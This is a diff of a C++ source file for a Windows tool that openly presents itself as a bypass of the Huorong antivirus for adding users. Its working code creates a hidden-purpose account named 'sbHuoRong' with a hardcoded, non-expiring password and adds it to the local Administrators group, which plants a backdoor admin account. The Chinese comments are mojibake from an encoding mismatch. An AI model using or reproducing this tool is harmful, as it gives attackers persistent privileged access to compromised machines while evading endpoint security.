@@ -1,125 +1,136 @@
 /***********************************************************************
-ã€+ã€‘bypass ç«ç»’æ·»åŠ ç”¨æˆ·
-ã€+ã€‘https://github.com/0x6C696A756E/bypass_HuoRong_addUser 
-ã€+ã€‘- 0x6C696A756E -
-ã€+ã€‘Date 2023/9/19
+¡¾+¡¿bypass »ğÈŞÌí¼ÓÓÃ»§
+¡¾+¡¿static/MT±àÒë ×îµÍÖ§³ÖWindwos xp
+¡¾+¡¿https://github.com/0x6C696A756E/bypass_HuoRong_addUser 
+¡¾+¡¿LiJun - 0x6C696A756E
+¡¾+¡¿Date 2023/9/19
 ***********************************************************************/
 #define _CRT_SECURE_NO_WARNINGS
 #include <windows.h>
 #include <lm.h>
 #include <stdio.h>
 #include <ctime>
-#pragma comment(lib, "netapi32.lib")//é“¾æ¥ç³»ç»Ÿé™æ€åº“
+#pragma comment(lib, "netapi32.lib")//Á´½ÓÏµÍ³¾²Ì¬¿â
 
-//å‡½æ•°ç”³æ˜
+//º¯ÊıÉêÃ÷
 int AddUser(LPWSTR username_args, LPWSTR password_args);
 int AddLocalGroupAdministrators(LPWSTR user);
 int UserExists(LPWSTR userName);
 void GetSystemTime();
 
-HANDLE consolehwnd;//åˆ›å»ºæ§åˆ¶å°å¥æŸ„ å®ç°è¾“å‡ºç»¿è‰²å­—ä½“
+HANDLE consolehwnd;//´´½¨¿ØÖÆÌ¨¾ä±ú ÊµÏÖÊä³öÂÌÉ«×ÖÌå
 int main(int argc, char* args[])
 {
-    consolehwnd = GetStdHandle(STD_OUTPUT_HANDLE);//å®ä¾‹åŒ–å¥æŸ„
-    const wchar_t* username = L"sbHuoRong";//æ·»åŠ çš„ç”¨æˆ·å const wchar_t* å®½å­—èŠ‚å¸¸æŒ‡é’ˆç±»å‹
-    const wchar_t* password = L"admin@Fuck748";//æ·»åŠ çš„å¯†ç  const wchar_t* å®½å­—èŠ‚å¸¸æŒ‡é’ˆç±»å‹
-    // å°† const wchar_t* è½¬æ¢ä¸º LPWSTR
-    wchar_t* usernameWritable = const_cast<wchar_t*>(username);//å¼ºè½¬ä¸ºLPWSTRç±»å‹
-    wchar_t* passwordWritable = const_cast<wchar_t*>(password);//å¼ºè½¬ä¸ºLPWSTRç±»å‹
-    //å…ˆåˆ¤æ–­sbHuoRong è¿™ä¸ªç”¨æˆ·æ˜¯å¦å­˜åœ¨ ä¸å­˜åœ¨åˆ™è¿›è¡Œæ·»åŠ ï¼Œå­˜åœ¨åˆ™ç»™å‡ºæç¤ºï¼
+    printf("\n");
+    printf("******************************************************************************\n");
+    printf("¡¾+¡¿bypass »ğÈŞÌí¼ÓÓÃ»§\n");
+    printf("¡¾+¡¿static/MT±àÒë ×îµÍÖ§³ÖWindwos xp\n");
+    printf("¡¾+¡¿https://github.com/0x6C696A756E/bypass_HuoRong_addUser \n");
+    printf("¡¾+¡¿https://blog.csdn.net/qq_29826869\n");
+    printf("¡¾+¡¿- 0x6C696A756E -\n");
+    printf("¡¾+¡¿Date 2023/9/18\n");
+    printf("******************************************************************************\n");
+    printf("\n");
+    consolehwnd = GetStdHandle(STD_OUTPUT_HANDLE);//ÊµÀı»¯¾ä±ú
+    const wchar_t* username = L"sbHuoRong";//Ìí¼ÓµÄÓÃ»§Ãû const wchar_t* ¿í×Ö½Ú³£Ö¸ÕëÀàĞÍ
+    const wchar_t* password = L"admin@Fuck748";//Ìí¼ÓµÄÃÜÂë const wchar_t* ¿í×Ö½Ú³£Ö¸ÕëÀàĞÍ
+    // ½« const wchar_t* ×ª»»Îª LPWSTR
+    wchar_t* usernameWritable = const_cast<wchar_t*>(username);//Ç¿×ªÎªLPWSTRÀàĞÍ
+    wchar_t* passwordWritable = const_cast<wchar_t*>(password);//Ç¿×ªÎªLPWSTRÀàĞÍ
+    //ÏÈÅĞ¶ÏsbHuoRong Õâ¸öÓÃ»§ÊÇ·ñ´æÔÚ ²»´æÔÚÔò½øĞĞÌí¼Ó£¬´æÔÚÔò¸ø³öÌáÊ¾£¡
     int code = UserExists(usernameWritable);
     switch (code)
     {
     case 200:
-        //å­˜åœ¨åˆ™ç»™å‡ºæç¤º
-        GetSystemTime();//è·å–ç³»ç»Ÿæ—¶é—´
+        //´æÔÚÔò¸ø³öÌáÊ¾
+        GetSystemTime();//»ñÈ¡ÏµÍ³Ê±¼ä
         printf("[+] https://github.com/0x6C696A756E/bypass_HuoRong_addUser\n");
-        SetConsoleTextAttribute(consolehwnd, FOREGROUND_RED);//è®¾ç½®çº¢è‰²
-        printf("The user sbHuoRong already existsï¼\n");//æ­¤å¤„ä¸ºçº¢è‰²å­—ä½“
-        SetConsoleTextAttribute(consolehwnd, 7); // æ¢å¤æ§åˆ¶å°é»˜è®¤é¢œè‰²
+        SetConsoleTextAttribute(consolehwnd, FOREGROUND_RED);//ÉèÖÃºìÉ«
+        printf("The user sbHuoRong already exists£¡\n");//´Ë´¦ÎªºìÉ«×ÖÌå
+        SetConsoleTextAttribute(consolehwnd, 7); // »Ö¸´¿ØÖÆÌ¨Ä¬ÈÏÑÕÉ«
         break;
     case 404:
-        //ä¸å­˜åœ¨
-         //æ·»åŠ ç”¨æˆ·åå’Œå¯†ç 
-        GetSystemTime();//è·å–ç³»ç»Ÿæ—¶é—´
+        //²»´æÔÚ
+         //Ìí¼ÓÓÃ»§ÃûºÍÃÜÂë
+        GetSystemTime();//»ñÈ¡ÏµÍ³Ê±¼ä
         AddUser(usernameWritable, passwordWritable);
-        //æŠŠç”¨æˆ·æ·»åŠ åˆ°ç®¡ç†å‘˜ç»„
+        //°ÑÓÃ»§Ìí¼Óµ½¹ÜÀíÔ±×é
         AddLocalGroupAdministrators(usernameWritable);
         break;
     case 500:
-        //å…¶ä»–é”™è¯¯
-        GetSystemTime();//è·å–ç³»ç»Ÿæ—¶é—´
-        SetConsoleTextAttribute(consolehwnd, FOREGROUND_RED);//è®¾ç½®å­—ä½“çº¢è‰²
+        //ÆäËû´íÎó
+        GetSystemTime();//»ñÈ¡ÏµÍ³Ê±¼ä
+        SetConsoleTextAttribute(consolehwnd, FOREGROUND_RED);//ÉèÖÃ×ÖÌåºìÉ«
         printf("[+] https://github.com/0x6C696A756E/bypass_HuoRong_addUser\n");
-        printf("Other errorsï¼\n");//æ­¤å¤„ä¸ºçº¢è‰²å­—ä½“
-        SetConsoleTextAttribute(consolehwnd, 7); // æ¢å¤æ§åˆ¶å°é»˜è®¤é¢œè‰²
+        printf("Other errors£¡\n");//´Ë´¦ÎªºìÉ«×ÖÌå
+        SetConsoleTextAttribute(consolehwnd, 7); // »Ö¸´¿ØÖÆÌ¨Ä¬ÈÏÑÕÉ«
         break;
     }
     return 0;
 }
 
-//æ·»åŠ ç”¨æˆ·åå’Œå¯†ç æ–¹æ³•
+//Ìí¼ÓÓÃ»§ÃûºÍÃÜÂë·½·¨
 int AddUser(LPWSTR username_args, LPWSTR password_args) {
-    USER_INFO_1 userInfo;//å£°æ˜ç»“æ„ä½“
+    USER_INFO_1 userInfo;//ÉùÃ÷½á¹¹Ìå
     DWORD level = 1;
     DWORD error = 0;
-    // è®¾ç½®ç»“æ„ä½“ç”¨æˆ·ä¿¡æ¯ 
-    userInfo.usri1_name = username_args; // ç”¨æˆ·å
-    userInfo.usri1_password = password_args; // å¯†ç 
-    userInfo.usri1_priv = USER_PRIV_USER; // ç”¨æˆ·æƒé™ï¼Œè¿™é‡Œè®¾ç½®ä¸ºæ™®é€šç”¨æˆ·
-    userInfo.usri1_home_dir = NULL; // ç”¨æˆ·ä¸»ç›®å½•ï¼Œé»˜è®¤ä¸º NULL
-    userInfo.usri1_comment = NULL; // ç”¨æˆ·å¤‡æ³¨ï¼Œé»˜è®¤ä¸º NULL
-    userInfo.usri1_flags = UF_DONT_EXPIRE_PASSWD;// ç”¨æˆ·æ ‡å¿—è¿™é‡Œè®¾ç½®ä¸ºå¯†ç æ°¸ä¸è¿‡æœŸ
-    userInfo.usri1_script_path = NULL;//ç”¨æˆ·è„šæœ¬è·¯å¾„
-    // æ·»åŠ ç”¨æˆ·
+    // ÉèÖÃ½á¹¹ÌåÓÃ»§ĞÅÏ¢ 
+    userInfo.usri1_name = username_args; // ÓÃ»§Ãû
+    userInfo.usri1_password = password_args; // ÃÜÂë
+    userInfo.usri1_priv = USER_PRIV_USER; // ÓÃ»§È¨ÏŞ£¬ÕâÀïÉèÖÃÎªÆÕÍ¨ÓÃ»§
+    userInfo.usri1_home_dir = NULL; // ÓÃ»§Ö÷Ä¿Â¼£¬Ä¬ÈÏÎª NULL
+    userInfo.usri1_comment = NULL; // ÓÃ»§±¸×¢£¬Ä¬ÈÏÎª NULL
+    userInfo.usri1_flags = UF_DONT_EXPIRE_PASSWD;// ÓÃ»§±êÖ¾ÕâÀïÉèÖÃÎªÃÜÂëÓÀ²»¹ıÆÚ
+    userInfo.usri1_script_path = NULL;//ÓÃ»§½Å±¾Â·¾¶
+    // Ìí¼ÓÓÃ»§
     NET_API_STATUS result = NetUserAdd(NULL, level, (LPBYTE)&userInfo,(LPDWORD)&error );//(LPDWORD)&error
     if (result == NERR_Success)
     {
-        SetConsoleTextAttribute(consolehwnd, FOREGROUND_INTENSITY | FOREGROUND_GREEN);//è®¾ç½®ç»¿è‰²
-        //æ­¤å¤„ä¸ºç»¿è‰²å­—ä½“
+        SetConsoleTextAttribute(consolehwnd, FOREGROUND_INTENSITY | FOREGROUND_GREEN);//ÉèÖÃÂÌÉ«
+        //´Ë´¦ÎªÂÌÉ«×ÖÌå
         printf("[+] https://github.com/0x6C696A756E/bypass_HuoRong_addUser\n");
         printf("[+] Support  Versions of Windows XP - Windows 11 -- (x86 or x64)\n");
         printf("[+] Support  Versions of Windows Server 2003 - Windows Server 2022 -- (x86 or x64)\n");
-        printf("[+] Add User Successfulï¼\n");
+        printf("[+] Add User Successful£¡\n");
         printf("[+] Username is -> sbHuoRong\n");
         printf("[+] Password is -> admin@Fuck748\n");
-        printf("[+] Password never expiresï¼\n");
-        SetConsoleTextAttribute(consolehwnd, 7); // æ¢å¤æ§åˆ¶å°é»˜è®¤é¢œè‰²
+        printf("[+] Password never expires£¡\n");
+        SetConsoleTextAttribute(consolehwnd, 7); // »Ö¸´¿ØÖÆÌ¨Ä¬ÈÏÑÕÉ«
     }
     else
     {
-        SetConsoleTextAttribute(consolehwnd, FOREGROUND_RED);//è®¾ç½®å­—ä½“çº¢è‰²
-        //æ­¤å¤„ä¸ºçº¢è‰²å­—ä½“
+        SetConsoleTextAttribute(consolehwnd, FOREGROUND_RED);//ÉèÖÃ×ÖÌåºìÉ«
+        //´Ë´¦ÎªºìÉ«×ÖÌå
         printf("[+] https://github.com/0x6C696A756E/bypass_HuoRong_addUser\n");
-        printf("!!! Add User Error!ï¼ŒCodeï¼š%d\n", result);
-        SetConsoleTextAttribute(consolehwnd, 7); // æ¢å¤æ§åˆ¶å°é»˜è®¤é¢œè‰²
+        printf("!!! Add User Error!£¬Code£º%d\n", result);
+        SetConsoleTextAttribute(consolehwnd, 7); // »Ö¸´¿ØÖÆÌ¨Ä¬ÈÏÑÕÉ«
     }
     return 0;
 }
 
-//æŠŠç”¨æˆ·æ·»åŠ åˆ°ç®¡ç†å‘˜ç»„
+//°ÑÓÃ»§Ìí¼Óµ½¹ÜÀíÔ±×é
 int AddLocalGroupAdministrators(LPWSTR user) {
-    // å°†ç”¨æˆ·æ·»åŠ åˆ°ç®¡ç†å‘˜ç»„
+    // ½«ÓÃ»§Ìí¼Óµ½¹ÜÀíÔ±×é
     LOCALGROUP_MEMBERS_INFO_3 members;
     members.lgrmi3_domainandname = user;
     DWORD  result = NetLocalGroupAddMembers(NULL, L"Administrators", 3, reinterpret_cast<LPBYTE>(&members), 1);
     if (result == NERR_Success) {
-        // ç”¨æˆ·æ·»åŠ åˆ°ç®¡ç†å‘˜ç»„æˆåŠŸ
-        SetConsoleTextAttribute(consolehwnd, FOREGROUND_INTENSITY | FOREGROUND_GREEN);//è®¾ç½®ç»¿è‰²
-        printf("[+] Add User sbHuoRong to administrators Successfulï¼\n");//æ­¤å¤„ä¸ºç»¿è‰²å­—ä½“
-        SetConsoleTextAttribute(consolehwnd, 7); // æ¢å¤æ§åˆ¶å°é»˜è®¤é¢œè‰²
+        // ÓÃ»§Ìí¼Óµ½¹ÜÀíÔ±×é³É¹¦
+        SetConsoleTextAttribute(consolehwnd, FOREGROUND_INTENSITY | FOREGROUND_GREEN);//ÉèÖÃÂÌÉ«
+        printf("[+] Add User sbHuoRong to administrators Successful£¡\n");//´Ë´¦ÎªÂÌÉ«×ÖÌå
+        SetConsoleTextAttribute(consolehwnd, 7); // »Ö¸´¿ØÖÆÌ¨Ä¬ÈÏÑÕÉ«
     }
     else {
-        // ç”¨æˆ·æ·»åŠ åˆ°ç®¡ç†å‘˜ç»„å¤±è´¥
-        SetConsoleTextAttribute(consolehwnd, FOREGROUND_RED);//è®¾ç½®å­—ä½“çº¢è‰²
-        //æ­¤å¤„ä¸ºçº¢è‰²å­—ä½“
-        printf("!!! Add LocalGroup Error!ï¼ŒCodeï¼š%d\n", result);
-        SetConsoleTextAttribute(consolehwnd, 7); // æ¢å¤æ§åˆ¶å°é»˜è®¤é¢œè‰²
+        // ÓÃ»§Ìí¼Óµ½¹ÜÀíÔ±×éÊ§°Ü
+        SetConsoleTextAttribute(consolehwnd, FOREGROUND_RED);//ÉèÖÃ×ÖÌåºìÉ«
+        //´Ë´¦ÎªºìÉ«×ÖÌå
+        printf("!!! Add LocalGroup Error!£¬Code£º%d\n", result);
+        SetConsoleTextAttribute(consolehwnd, 7); // »Ö¸´¿ØÖÆÌ¨Ä¬ÈÏÑÕÉ«
     }
     return 0;
 }
 
-//åˆ¤æ–­sbHuoRong ç”¨æˆ·æ˜¯å¦å­˜åœ¨
+//ÅĞ¶ÏsbHuoRong ÓÃ»§ÊÇ·ñ´æÔÚ
 int UserExists(LPWSTR userName) {
     USER_INFO_1* userInfo = NULL;
     DWORD dwLevel = 1;
@@ -127,29 +138,29 @@ int UserExists(LPWSTR userName) {
     // Get user info
     dwError = NetUserGetInfo(NULL, userName, dwLevel, (LPBYTE*)&userInfo);
     if (dwError == NERR_UserNotFound) {
-        // User does not exist ä¸å­˜åœ¨
+        // User does not exist ²»´æÔÚ
         return 404;
     }
     else if (dwError == NERR_Success) {
-        // User exists å­˜åœ¨
+        // User exists ´æÔÚ
         return 200;
     }
     else {
-        // Error å…¶ä»–é”™è¯¯
+        // Error ÆäËû´íÎó
         return 500;
     }
-    NetApiBufferFree(userInfo);//æŒ‡é’ˆé‡Šæ”¾
+    NetApiBufferFree(userInfo);//Ö¸ÕëÊÍ·Å
 }
 
 
-//è·å–ç³»ç»Ÿæ—¶é—´ å…¼å®¹VC++ 6.0å†™æ³•
+//»ñÈ¡ÏµÍ³Ê±¼ä ¼æÈİVC++ 6.0Ğ´·¨
 void GetSystemTime() {
     time_t now = time(0);
     char timestamp[80];
     struct tm tstruct;
     tstruct = *localtime(&now);
     strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", &tstruct);
-    SetConsoleTextAttribute(consolehwnd, FOREGROUND_INTENSITY | FOREGROUND_GREEN);//è®¾ç½®ç»¿è‰²
+    SetConsoleTextAttribute(consolehwnd, FOREGROUND_INTENSITY | FOREGROUND_GREEN);//ÉèÖÃÂÌÉ«
     printf("[+] %s\n", timestamp);
-    SetConsoleTextAttribute(consolehwnd, 7); // æ¢å¤æ§åˆ¶å°é»˜è®¤é¢œè‰²
+    SetConsoleTextAttribute(consolehwnd, 7); // »Ö¸´¿ØÖÆÌ¨Ä¬ÈÏÑÕÉ«
 }
